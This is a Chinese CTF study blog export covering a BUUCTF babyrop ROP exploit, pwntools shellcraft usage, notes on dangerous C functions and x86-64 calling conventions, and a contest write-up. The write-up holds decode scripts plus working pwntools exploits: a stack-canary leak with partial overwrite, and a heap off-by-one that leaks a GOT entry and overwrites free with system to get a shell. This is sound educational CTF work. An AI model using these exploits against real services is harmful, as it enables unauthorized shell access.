<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-none"><code class="language-none">from pwn import *
context.log_level &#x3D; &quot;debug&quot;

# io &#x3D; process(&#39;.&#x2F;babyrop&#39;)
io &#x3D; remote(&#39;node3.buuoj.cn&#39;,&#39;28379&#39;)
e &#x3D; ELF(&#39;.&#x2F;babyrop&#39;)

binsh_addr &#x3D; 0x601048
system_addr &#x3D; e.symbols[&#39;system&#39;]
pop_rdi &#x3D; 0x400683

io.recvuntil(&#39;your name?&#39;)
payload &#x3D; 0x18 * b&#39;a&#39; + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
io.sendline(payload)
io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里夺权之后还有一个小坑，就是flag不在根目录下，需要通过查找获得位置，然后拿到flag</p>
<p><img src="/img/image-20210620202949778.png" alt="image-20210620202949778"></p>
<p>这是属于最简单的例题，稍微难一点的会涉及到计算地址偏移量。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>shellcode</title>
    <url>/2021/11226d1e.html</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>主要是普及一下shellcode在pwntools中的用法</p>
<h2 id="shellcraft模块"><a href="#shellcraft模块" class="headerlink" title="shellcraft模块"></a>shellcraft模块</h2><p>shellcraft模块是shellcode的模块，包含一些生成shellcode的函数。<br>其中的子模块声明架构，比如shellcraft.arm 是ARM架构的，shellcraft.amd64是AMD64架构，shellcraft.i386是Intel 80386架构的，以及有一个shellcraft.common是所有架构通用的。<br>有的时候我们需要在写exp的时候用到简单的shellcode，pwntools提供了对简单的shellcode的支持。<br>首先，常用的，也是最简单的shellcode，即调用/bin/sh可以通过shellcraft得到：<br>注意，由于各个平台，特别是32位和64位的shellcode不一样，所以最好先设置context。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 打印出shellcode</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 打印出汇编后的shellcod</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>asm可以对汇编代码进行汇编，不过pwntools目前的asm实现还有一些缺陷，比如不能支持相对跳转等等，只可以进行简单的汇编操作。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>一些危险函数和64位寄存器与32位不同之处</title>
    <url>/2021/0626e56e.html</url>
    <content><![CDATA[<span id="more"></span>
<p>列举一下常见的危险函数：</p>
<h4 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h4><pre><code>    gets，直接读取一行，忽略&#39;\x00&#39;
    scanf
    vscanf
</code></pre>
<h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><pre><code>    sprintf
</code></pre>
<h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code>    strcpy，字符串复制，遇到&#39;\x00&#39;停止
    strcat，字符串拼接，遇到&#39;\x00&#39;停止
    copy
</code></pre>
<h3 id="64位与32位寄存器区别有："><a href="#64位与32位寄存器区别有：" class="headerlink" title="64位与32位寄存器区别有："></a>64位与32位寄存器区别有：</h3><p>64位有16个寄存器，32位只有8个。但是32位前8个都有不同的命名，分别是e _ ，而64位前8个使用了r代替e，也就是r_。<br>e开头的寄存器命名依然可以直接运用于相应寄存器的低32位。而剩下的寄存器名则是从r8 - r15，其低位分别用d，w,b指定长度。</p>
<p>32位使用栈帧来作为传递的参数的保存位置，而64位使用寄存器，分别用rdi,rsi,rdx,rcx,r8,r9作为第1-6个参数。rax作为返回值。</p>
<p>64位没有栈帧的指针，32位用ebp作为栈帧指针，64位取消了这个设定，rbp作为通用寄存器使用。</p>
<p>64位支持一些形式的以PC相关的寻址，而32位只有在jmp的时候才会用到这种寻址方式。</p>
<p><img src="/img/64.png"></p>
<h3 id="过程（函数）调用的不同"><a href="#过程（函数）调用的不同" class="headerlink" title="过程（函数）调用的不同"></a>过程（函数）调用的不同</h3><pre><code>参数通过寄存器传递（见前文）
callq 在栈里存放一个8位的返回地址
许多函数不再有栈帧，只有无法将所有本地变量放在寄存器里的才会在栈上分配空间。
函数可以获取到栈至多128字节的空间。这样函数就可以在不更改栈指针的情况下在栈上存储信息（也就是说，可以提前用rsp以下的128字节空间，这段空间被称为red zone，在x86-64里，时刻可用）
不再有栈帧指针。现在栈的位置和栈指针相关。大多数函数在调用的一开始就分配全部所需栈空间，之后保持栈指针不改变。

一些寄存器被设计成为被调用者-存储的寄存器。这些必须在需要改变他们值的时候存储他们并且之后恢复他们。
</code></pre>
<h3 id="参数传递的不同"><a href="#参数传递的不同" class="headerlink" title="参数传递的不同"></a>参数传递的不同</h3><pre><code>6个寄存器用来传递参数（见前文）
剩下的寄存器按照之前的方式传递（不过是与rsp相关了，ebp不再作为栈帧指针，并且从rsp开始第7个参数，rsp+8开始第8个，以此类推）
调用时，rsp向下移动8位（存入返回地址），寄存器参数无影响，第7个及之后的参数现在则是从rsp+8开始第7个，rsp+16开始第8个，以此类推
</code></pre>
<h3 id="栈帧的不同"><a href="#栈帧的不同" class="headerlink" title="栈帧的不同"></a>栈帧的不同</h3><p>很多情况下不再需要栈帧，比如在没有调用别的函数，且寄存器足以存储参数，那么就只需要存储返回地址即可。<br>需要栈帧的情况：</p>
<pre><code>本地变量太多，寄存器不够
一些本地变量是数组或结构体
函数使用了取地址操作符来计算一个本地变量的地址
函数必须用栈传送一些参数给另外一个函数
函数需要保存一些由被调用者存储的寄存器的状态（以便于恢复）
</code></pre>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>xjusec考核赛</title>
    <url>/2021/082666e9.html</url>
    <content><![CDATA[<h1 id="xjusec考核赛wp"><a href="#xjusec考核赛wp" class="headerlink" title="xjusec考核赛wp"></a>xjusec考核赛wp</h1><h2 id="REVERSE："><a href="#REVERSE：" class="headerlink" title="REVERSE："></a>REVERSE：</h2><h3 id="justbase64"><a href="#justbase64" class="headerlink" title="justbase64"></a>justbase64</h3><p>这个题是以前看见过的一个类似的题，ida打开</p>
<p><img src="/img/image-20210825211051630.png" alt="image-20210825211051630"></p>
<p>这边目录看见encode_one,encode_two,encode_three三个编码，右边主函数里就是三次编码后形成的”EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG”，题目也有提示base64，但肯定不只有base64</p>
<p>挨个看，在encode_one里面发现一个变量alphabet，肯定了base64的存在</p>
<p><img src="/img/image-20210825211343129.png" alt="image-20210825211343129"></p>
<p>encode_two里面关系一张图解释</p>
<p><img src="/img/image-20210825211513679.png" alt="image-20210825211513679"></p>
<p><img src="/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210825211744.jpg"></p>
<p>就是这样的一个对应关系</p>
<p>encode_three就是有个移位的问题</p>
<p><img src="/img/image-20210825211933760.png" alt="image-20210825211933760"></p>
<p><img src="/img/20200911131956308.png"></p>
<p>要还原就从three开始倒过来还原</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">m</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> v5 <span class="token operator">&lt;=</span> <span class="token number">64</span> <span class="token keyword">or</span> v5 <span class="token operator">></span> <span class="token number">90</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> v5 <span class="token operator">&lt;=</span> <span class="token number">96</span> <span class="token keyword">or</span> v5 <span class="token operator">></span> <span class="token number">122</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> v5 <span class="token operator">&lt;=</span> <span class="token number">47</span> <span class="token keyword">or</span> v5 <span class="token operator">></span> <span class="token number">57</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v5 <span class="token operator">-</span> <span class="token number">45</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v5 <span class="token operator">-</span> <span class="token number">94</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v5 <span class="token operator">-</span> <span class="token number">62</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">)</span>


mm <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    raw <span class="token operator">=</span> i
    fin <span class="token operator">=</span> m<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    mm<span class="token punctuation">[</span>fin<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>raw<span class="token punctuation">)</span>

data <span class="token operator">=</span> <span class="token string">"EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG"</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>mm<span class="token punctuation">)</span>
fin2 <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> c <span class="token keyword">in</span> data<span class="token punctuation">:</span>
    fin2 <span class="token operator">+=</span> mm<span class="token punctuation">[</span>c<span class="token punctuation">]</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>fin2<span class="token punctuation">)</span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/img/image-20210825212900481.png" alt="image-20210825212900481"></p>
<p>再还原two，最后base64解码得到flag</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
data <span class="token operator">=</span> <span class="token string">"BjYjM2Mjk4NzMR1dIVHs2NzJjY0MTEzM2VhMn0=zQ3NzhhMzhlOD"</span>

raw <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"0"</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

raw<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">:</span> <span class="token number">26</span><span class="token punctuation">]</span>
raw<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">:</span> <span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">:</span> <span class="token number">52</span><span class="token punctuation">]</span>
raw<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">:</span> <span class="token number">39</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token number">13</span><span class="token punctuation">]</span>
raw<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">:</span> <span class="token number">52</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">:</span> <span class="token number">39</span><span class="token punctuation">]</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>raw<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="pwn："><a href="#pwn：" class="headerlink" title="pwn："></a>pwn：</h2><h3 id="ez-pwn（partial-overwrite-部分覆盖）"><a href="#ez-pwn（partial-overwrite-部分覆盖）" class="headerlink" title="ez_pwn（partial overwrite 部分覆盖）"></a>ez_pwn（partial overwrite 部分覆盖）</h3><p>这个题我觉得一点也不简单，在拿到hint之后才借助互联网的力量把他弄出来，过程艰辛</p>
<p><img src="/img/image-20210825212508971.png" alt="image-20210825212508971"></p>
<p><img src="/img/image-20210825214242973.png" alt="image-20210825214242973"></p>
<p>一种比较新鲜的栈溢出，叫 <strong>花式栈溢出</strong> </p>
<p>partial overwrite：在开启了PIE后，无论高位地址如何变化，低位地址是不变的，意味着有概率“撞到”正确的地址</p>
<p><img src="/img/image-20210825213240232.png" alt="image-20210825213240232"></p>
<p>主要的问题就是开启了canary，而栈溢出在第二次read函数里，有canary保护 ，read读满不会追加\0 。可以计算出第一次 read 需要的长度为 0x30 - 0x8 + 1 (+ 1 是为了覆盖 canary 的最低位为非 0 的值, printf 使用 %s 时, 遇到 \0 结束, 覆盖 canary 低位为非 0 值时, canary 就可以被 printf 打印出来了)</p>
<p><img src="/img/image-20210825213949666.png" alt="image-20210825213949666"></p>
<p>同时也发现了夺权函数，那么第二次栈溢出只要返回到夺权函数地址就行了</p>
<p>最后脚本多次的尝试才拿到了flag，因为返回地址与 get shell 函数的地址只有低位的 16 bit 不同, 如果覆写低 16 bit 为<code>0x0A3E</code>, 就有一定的几率 get shell</p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"175.24.233.124"</span><span class="token punctuation">,</span><span class="token number">10001</span><span class="token punctuation">)</span>
    <span class="token comment">#io=process('./ez_pwn',timeout=1)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Name:\n'</span><span class="token punctuation">)</span>
    payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>payload<span class="token operator">+</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>
    canary<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'canary:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':\n'</span><span class="token punctuation">)</span>
    payload<span class="token operator">=</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span><span class="token string">b'\x3E\x0A'</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="mid-pwn"><a href="#mid-pwn" class="headerlink" title="mid_pwn"></a>mid_pwn</h3><p><img src="/img/image-20210825214846902.png" alt="image-20210825214846902"></p>
<p>ida打开后，看见menu函数，五个功能</p>
<p>Create_Heap函数</p>
<p><img src="/img/image-20210825215031703.png" alt="image-20210825215031703"></p>
<p>读完后发现有两次malloc，就意味着申请了两次，第一个chunk可以看作是记录的作用，里面存放着第二个chunk的size和指针，同时，第一个chunk的地址指针保存在bss段中heaparray数组这里，两个大小都是0x20的chunk，举个例子方便理解</p>
<pre class="line-numbers language-none"><code class="language-none">0x603000: 0x0000000000000000 0x0000000000000021
0x603010: 0x0000000000000010 0x0000000000603030 (chunk0的大小和指针）
0x603020: 0x0000000000000000 0x0000000000000021 (chunk0)
0x603030: 0x0000000a61616161 0x0000000000000000 (“aaaa”)
0x603040: 0x0000000000000000 0x0000000000000021
0x603050: 0x0000000000000010 0x0000000000603070 (chunk1的大小和指针）
0x603060: 0x0000000000000000 0x0000000000000021 (chunk1)
0x603070: 0x0000000a62626262 0x0000000000000000 (“bbbb”)
0x603080: 0x0000000000000000 0x0000000000020f81 (top chunk)
0x603090: 0x0000000000000000 0x0000000000000000
0x6030a0: 0x0000000000000000 0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后是edit_heap函数</p>
<p><img src="/img/image-20210825215827003.png" alt="image-20210825215827003"></p>
<p>在这里发现了off-by-one漏洞</p>
<p>show_heap函数：</p>
<p><img src="/img/image-20210825215943902.png" alt="image-20210825215943902"></p>
<p>最后的delete_heap函数读出最后会把之前申请到的两个chunk都free掉</p>
<p><img src="/img/image-20210825220059801.png" alt="image-20210825220059801"></p>
<h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><p><strong>1.利用 off by one 漏洞覆盖下一个 chunk 的 size 字段，从而构造伪造的 chunk 大小。<br> 2.申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。</strong></p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'175.24.233.124'</span><span class="token punctuation">,</span><span class="token number">10002</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>
	r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size of Heap : "</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content of heap:"</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>value<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>
	r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content of heap : "</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>value<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
	r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'cccc'</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span><span class="token string">b'\x81'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

size <span class="token operator">=</span> <span class="token string">b'\x08'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">b'd'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span> size <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content : '</span><span class="token punctuation">)</span>
free_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Done'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">"free"</span><span class="token punctuation">,</span>free_addr<span class="token punctuation">)</span>
system_addr<span class="token operator">=</span>free_addr<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"free"</span><span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto:"></a>Crypto:</h2><h3 id="tik-tak"><a href="#tik-tak" class="headerlink" title="tik-tak"></a>tik-tak</h3><p>根据提示键盘码，坐标轴那种，于是验证猜想，看到文档名称是tiktiktaktak，于是所有都回移一层，比如66该是第六行第二列，因为是两个6，但题目本身重叠，所以就该是第六行第一列，以此类推得出结果</p>
<h2 id="MISC："><a href="#MISC：" class="headerlink" title="MISC："></a>MISC：</h2><h3 id="缩小查看更多"><a href="#缩小查看更多" class="headerlink" title="缩小查看更多"></a>缩小查看更多</h3><p>这个题，我的方法比较硬来，直接stegsolve打开，看照片层，隐约明显能看清</p>
<p><img src="/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210825221547.png"></p>
<p><img src="/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210825221552.png"></p>
<h3 id="仅仅是流量分析？"><a href="#仅仅是流量分析？" class="headerlink" title="仅仅是流量分析？"></a>仅仅是流量分析？</h3><p>根据hint</p>
<p><img src="/img/image-20210825221847222.png" alt="image-20210825221847222"></p>
<p>ftm文件，rar损坏</p>
<p>ftm文件解压点开后还有个key.pcap文件</p>
<p>wireshark打开发现数据包，脚本得到数据包内容</p>
<p>然后010打开rar文件，发现文件块位置错误，修改后正常解压</p>
<p>打开发现233.png</p>
<p>stegsolve打开233.png，逐层找，找到一个二维码，扫码后拿到flag原样，结合xinan发现是维吉尼亚密码，再解密后又是栅栏密码，最后拿到flag</p>
<p><img src="/img/image-20210825222821574.png" alt="image-20210825222821574"></p>
<h3 id="可爱猫猫"><a href="#可爱猫猫" class="headerlink" title="可爱猫猫"></a>可爱猫猫</h3><p>两张表面上一样的图片</p>
<p>盲水印的问题，用github上的脚本</p>
<p><a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a></p>
<p>跑出结果</p>
<p><img src="/img/flag.png"></p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf8 -*-</span>

<span class="token keyword">import</span> sys
<span class="token keyword">import</span> random

cmd <span class="token operator">=</span> <span class="token boolean">None</span>
debug <span class="token operator">=</span> <span class="token boolean">False</span>
seed <span class="token operator">=</span> <span class="token number">20160930</span>
oldseed <span class="token operator">=</span> <span class="token boolean">False</span>
